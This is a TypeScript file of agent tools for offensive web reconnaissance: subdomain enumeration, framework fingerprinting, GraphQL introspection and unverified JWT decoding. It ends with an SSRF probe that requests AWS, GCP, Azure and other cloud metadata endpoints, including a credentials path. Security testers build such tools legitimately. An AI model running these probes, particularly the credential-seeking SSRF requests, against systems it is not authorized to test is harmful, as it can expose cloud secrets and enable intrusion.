import { createTool } from '@mastra/core/tools'
import { z } from 'zod'

function base64urlDecode(s: string): string {
  try {
    const b64 = s.replace(/-/g, '+').replace(/_/g, '/').padEnd(Math.ceil(s.length / 4) * 4, '=')
    return new TextDecoder().decode(Uint8Array.from(atob(b64), c => c.charCodeAt(0)))
  } catch {
    return ''
  }
}

function isExpired(exp: number | undefined): boolean {
  if (exp === undefined) return false
  return Date.now() / 1000 > exp
}

function isAlgorithmVulnerable(alg: string): boolean {
  const weak = ['none', 'hs256', 'hs384', 'hs512']
  if (weak.includes(alg.toLowerCase())) return true
  return false
}

export const runRecon = createTool({
  id: 'runRecon',
  description: 'Runs lightweight recon against a target: whois, DNS, tech-stack fingerprinting, and subdomain discovery',
  inputSchema: z.object({
    target: z.string().describe('Target domain or URL to recon'),
    probes: z.array(z.enum(['whois', 'dns', 'tech-stack', 'endpoints', 'subdomains']))
      .default(['whois', 'dns', 'tech-stack', 'subdomains'])
      .describe('Recon probes to run'),
  }),
  execute: async (ctx): Promise<{ ok: boolean; value?: any; error?: string }> => {
    const { target, probes } = ctx
    const result: any = { target, whois: null, dnsRecords: null, techStack: [], subdomains: [] }

    const activeProbes = probes ?? []
    try {
      if (activeProbes.includes('whois')) {
        // TODO: Implement WHOIS lookup
        // const whoisRes = await fetch(`https://whois.freeaiapi.workers.dev/?domain=${encodeURIComponent(target)}`)
        // if (whoisRes.ok) {
        //   const whoisData = await whoisRes.json()
        //   result.whois = whoisData
        // }
      }
    } catch { /* best-effort */ }

    try {
      if (activeProbes.includes('dns')) {
        // TODO: Implement DNS lookup
        // const dnsRes = await fetch(`https://dns.google/resolve?name=${encodeURIComponent(target)}&type=ANY`)
        // if (dnsRes.ok) {
        //   const dnsData = await dnsRes.json()
        //   result.dnsRecords = dnsData
        // }
      }
    } catch { /* best-effort */ }

    try {
      if (activeProbes.includes('tech-stack') || activeProbes.includes('endpoints')) {
        const pageRes = await fetch(`https://${target.replace(/^https?:\/\//, '')}`, {
          signal: AbortSignal.timeout(10000),
        })
        const html = await pageRes.text()
        const headers: Record<string, string> = {}
        pageRes.headers.forEach((v, k) => { headers[k] = v })

        const frameworks: Array<{ name: string; version?: string; evidence: string }> = []

        const server = headers['server']
        if (server) frameworks.push({ name: 'Server', version: server, evidence: `Server header: ${server}` })
        const xpb = headers['x-powered-by']
        if (xpb) frameworks.push({ name: 'X-Powered-By', version: xpb, evidence: `X-Powered-By header: ${xpb}` })

        if (/__NEXT_DATA__|next\.js/i.test(html)) frameworks.push({ name: 'Next.js', evidence: '__NEXT_DATA__ found' })
        if (/ng-version|ng-app|angular/i.test(html)) frameworks.push({ name: 'Angular', evidence: 'ng-version/ng-app attribute' })
        if (/react-root|react-container|__REACT_DEVTOOLS|data-reactroot/i.test(html)) frameworks.push({ name: 'React', evidence: 'React root or data-reactroot' })
        if (/vue-app|__VUE_DEVTOOLS|v-bind|v-model/i.test(html)) frameworks.push({ name: 'Vue.js', evidence: 'Vue directives found' })
        if (/jquery/i.test(html)) frameworks.push({ name: 'jQuery', evidence: 'jQuery reference in HTML' })
        if (/wp-content|wp-includes|wordpress/i.test(html)) frameworks.push({ name: 'WordPress', evidence: 'WordPress-specific paths' })
        if (/laravel|livewire/i.test(html)) frameworks.push({ name: 'Laravel', evidence: 'Laravel/Livewire reference' })
        if (/django|csrfmiddlewaretoken/i.test(html)) frameworks.push({ name: 'Django', evidence: 'Django CSRF token or reference' })
        if (/express/i.test(html)) frameworks.push({ name: 'Express', evidence: 'Express reference in HTML' })
        if (/nuxt/i.test(html)) frameworks.push({ name: 'Nuxt', evidence: 'Nuxt reference' })
        if (/cloudflare|__cfduid|cflb/i.test(JSON.stringify(headers))) frameworks.push({ name: 'Cloudflare', evidence: 'Cloudflare headers found' })

        result.techStack = frameworks
      }
    } catch { /* best-effort */ }

    try {
      if (activeProbes.includes('subdomains')) {
        const domain = target.replace(/^https?:\/\//, '').split('/')[0]
        const crtRes = await fetch(`https://crt.sh/?q=%25.${encodeURIComponent(domain)}&output=json`, {
          signal: AbortSignal.timeout(15000),
        })
        if (crtRes.ok) {
          const certs: any[] = await crtRes.json()
          const unique = new Set<string>()
          for (const cert of certs) {
            if (cert.name_value) {
              cert.name_value.split('\n').forEach((n: string) => unique.add(n.trim()))
            }
          }
          result.subdomains = Array.from(unique).slice(0, 100)
        }
      }
    } catch { /* best-effort */ }

    return { ok: true, value: result }
  },
})

export const graphqlIntrospect = createTool({
  id: 'graphqlIntrospect',
  description: 'Attempts GraphQL introspection on a target endpoint to discover schema types, queries, and mutations',
  inputSchema: z.object({
    url: z.string().describe('Full GraphQL endpoint URL'),
  }),
  execute: async (ctx): Promise<{ ok: boolean; value?: any; error?: string }> => {
    const { url } = ctx

    try {
      const res = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ query: '{__schema{types{name fields{name}}}}' }),
        signal: AbortSignal.timeout(10000),
      })

      if (!res.ok) {
        return { ok: false, error: `HTTP ${res.status}: ${res.statusText}` }
      }

      const data = await res.json()

      if (!data.data?.__schema?.types) {
        return { ok: true, value: { introspectionEnabled: false, typeCount: 0, queryCount: 0, mutationCount: 0 } }
      }

      const types = data.data.__schema.types
      const typeCount = types.filter((t: any) => !t.name.startsWith('__')).length
      const queryType = types.find((t: any) => t.name === 'Query')
      const mutationType = types.find((t: any) => t.name === 'Mutation')
      const queryCount = queryType?.fields?.length ?? 0
      const mutationCount = mutationType?.fields?.length ?? 0

      return {
        ok: true,
        value: { introspectionEnabled: true, typeCount, queryCount, mutationCount },
      }
    } catch (err: any) {
      return { ok: false, error: err?.message ?? String(err) }
    }
  },
})

export const jwtDecode = createTool({
  id: 'jwtDecode',
  description: 'Decodes a JWT token without verifying signature, checking header, payload, expiry, and algorithm safety',
  inputSchema: z.object({
    token: z.string().describe('JWT token string to decode'),
  }),
  execute: async (ctx): Promise<{ ok: boolean; value?: any; error?: string }> => {
    const { token } = ctx

    try {
      const parts = token.split('.')
      if (parts.length !== 3) {
        return { ok: false, error: 'Invalid JWT format: expected 3 dot-separated segments' }
      }

      const headerRaw = base64urlDecode(parts[0])
      const payloadRaw = base64urlDecode(parts[1])

      if (!headerRaw || !payloadRaw) {
        return { ok: false, error: 'Failed to decode JWT segments' }
      }

      const header = JSON.parse(headerRaw)
      const payload = JSON.parse(payloadRaw)
      const algorithm = (header.alg as string) ?? 'unknown'

      return {
        ok: true,
        value: {
          header,
          payload,
          algorithm,
          isExpired: isExpired(payload.exp as number | undefined),
          algorithmVulnerable: isAlgorithmVulnerable(algorithm),
        },
      }
    } catch (err: any) {
      return { ok: false, error: err?.message ?? String(err) }
    }
  },
})

export const frameworkFingerprint = createTool({
  id: 'frameworkFingerprint',
  description: 'Fetches a URL and fingerprints the web framework using headers and HTML markers',
  inputSchema: z.object({
    url: z.string().describe('Full URL to fingerprint'),
  }),
  execute: async (ctx): Promise<{ ok: boolean; value?: any; error?: string }> => {
    const { url } = ctx

    try {
      const res = await fetch(url, { signal: AbortSignal.timeout(10000) })
      const html = await res.text()

      const headers: Record<string, string> = {}
      res.headers.forEach((v, k) => { headers[k] = v })

      const frameworks: Array<{ name: string; version?: string; evidence: string }> = []

      const checks: Array<{ name: string; test: (h: Record<string, string>, body: string) => { version?: string; evidence: string } | null }> = [
        {
          name: 'Cloudflare',
          test: (h) => h['server']?.toLowerCase().includes('cloudflare')
            ? { evidence: `Server header: ${h['server']}` } : null,
        },
        {
          name: 'Next.js',
          test: (_, b) => /__NEXT_DATA__/.test(b)
            ? { evidence: '__NEXT_DATA__ script found' } : null,
        },
        {
          name: 'Angular',
          test: (_, b) => {
            const m = b.match(/ng-version="([^"]+)"/)
            return m ? { version: m[1], evidence: `ng-version="${m[1]}"` }
              : /ng-app|ng-controller|ng-model/.test(b) ? { evidence: 'Angular directives found' } : null
          },
        },
        {
          name: 'React',
          test: (_, b) => /data-reactroot|data-reactid/.test(b)
            ? { evidence: 'data-reactroot/data-reactid attributes' } : null,
        },
        {
          name: 'Vue.js',
          test: (_, b) => /vue-app|__VUE_DEVTOOLS_GLOBAL_HOOK__|v-bind|v-model|v-for|v-if/.test(b)
            ? { evidence: 'Vue directives found' } : null,
        },
        {
          name: 'jQuery',
          test: (_, b) => {
            const m = b.match(/jquery[.-]v?(\d+\.\d+\.\d+)/i)
            return m ? { version: m[1], evidence: `jQuery ${m[1]} referenced` }
              : /jquery/i.test(b) ? { evidence: 'jQuery referenced' } : null
          },
        },
        {
          name: 'WordPress',
          test: (_, b) => /wp-content|wp-includes|wp-json/.test(b)
            ? { evidence: 'WordPress-specific paths found' } : null,
        },
        {
          name: 'Laravel',
          test: (_, b) => /laravel|livewire|csrf-token.*livewire/.test(b)
            ? { evidence: 'Laravel/Livewire markers found' } : null,
        },
        {
          name: 'Django',
          test: (_, b) => /csrfmiddlewaretoken|__admin_interface/.test(b)
            ? { evidence: 'Django CSRF token or admin interface' } : null,
        },
        {
          name: 'Nuxt',
          test: (_, b) => /nuxt/i.test(b)
            ? { evidence: 'Nuxt reference found' } : null,
        },
        {
          name: 'Express',
          test: (h, _) => h['x-powered-by']?.toLowerCase().includes('express')
            ? { evidence: `X-Powered-By: ${h['x-powered-by']}` } : null,
        },
      ]

      for (const check of checks) {
        const hMatch = check.test(headers, html)
        if (hMatch) {
          frameworks.push({ name: check.name, ...hMatch })
        }
      }

      const server = headers['server']
      if (server && !frameworks.find(f => f.name === 'Cloudflare' && f.evidence.includes('Server'))) {
        frameworks.push({ name: 'Server', version: server, evidence: `Server header: ${server}` })
      }
      const xpb = headers['x-powered-by']
      if (xpb && !frameworks.find(f => f.evidence.includes('X-Powered-By'))) {
        frameworks.push({ name: 'X-Powered-By', version: xpb, evidence: `X-Powered-By header: ${xpb}` })
      }

      return { ok: true, value: { frameworks } }
    } catch (err: any) {
      return { ok: false, error: err?.message ?? String(err) }
    }
  },
})

export const cloudMetadataProbe = createTool({
  id: 'cloudMetadataProbe',
  description: 'Probes cloud metadata endpoints via SSRF-style URL manipulation to detect cloud provider metadata APIs',
  inputSchema: z.object({
    url: z.string().describe('Target URL to manipulate for SSRF metadata probing'),
  }),
  execute: async (ctx): Promise<{ ok: boolean; value?: any; error?: string }> => {
    const { url } = ctx
    const base = url.replace(/\/+$/, '')

    const probes: Array<{ provider: string; url: string; suffix: string }> = [
      { provider: 'AWS', url: 'http://169.254.169.254/latest/meta-data/', suffix: '/latest/meta-data/' },
      { provider: 'AWS IMDSv2', url: 'http://169.254.169.254/latest/api/token', suffix: '/latest/api/token' },
      { provider: 'AWS ECS', url: 'http://169.254.170.2/v2/credentials/', suffix: '/v2/credentials/' },
      { provider: 'GCP', url: 'http://169.254.169.254/computeMetadata/v1/', suffix: '/computeMetadata/v1/' },
      { provider: 'Azure', url: 'http://169.254.169.254/metadata/instance?api-version=2021-02-01', suffix: '/metadata/instance?api-version=2021-02-01' },
      { provider: 'Alibaba', url: 'http://100.100.100.200/latest/meta-data/', suffix: '/latest/meta-data/' },
      { provider: 'DigitalOcean', url: 'http://169.254.169.254/metadata/v1.json', suffix: '/metadata/v1.json' },
    ]

    const results: Array<{ provider: string; url: string; status: number | string; responseSnippet: string | null }> = []

    const tryDirect = async (p: typeof probes[0]) => {
      try {
        const directRes = await fetch(p.url, {
          signal: AbortSignal.timeout(5000),
          ...(p.provider === 'GCP' ? { headers: { 'Metadata-Flavor': 'Google' } } : {}),
          ...(p.provider === 'AWS IMDSv2' ? { method: 'PUT', headers: { 'X-aws-ec2-metadata-token-ttl-seconds': '21600' } } : {}),
        })
        const text = await directRes.text()
        results.push({
          provider: p.provider,
          url: p.url,
          status: directRes.status,
          responseSnippet: text.slice(0, 300),
        })
      } catch {
        results.push({
          provider: p.provider,
          url: p.url,
          status: 'error',
          responseSnippet: null,
        })
      }
    }

    const trySsrf = async (p: typeof probes[0]) => {
      const ssrfUrl = `${base}/${encodeURIComponent(p.url)}`
      try {
        const ssrfRes = await fetch(ssrfUrl, {
          signal: AbortSignal.timeout(5000),
        })
        const text = await ssrfRes.text()
        if (text.length > 0 && !text.includes('404') && !text.includes('Not Found')) {
          results.push({
            provider: `${p.provider} (via SSRF)`,
            url: ssrfUrl,
            status: ssrfRes.status,
            responseSnippet: text.slice(0, 300),
          })
        }
      } catch { /* best-effort */ }
    }

    await Promise.all(probes.flatMap(p => [tryDirect(p), trySsrf(p)]))

    return { ok: true, value: { probes: results } }
  },
})

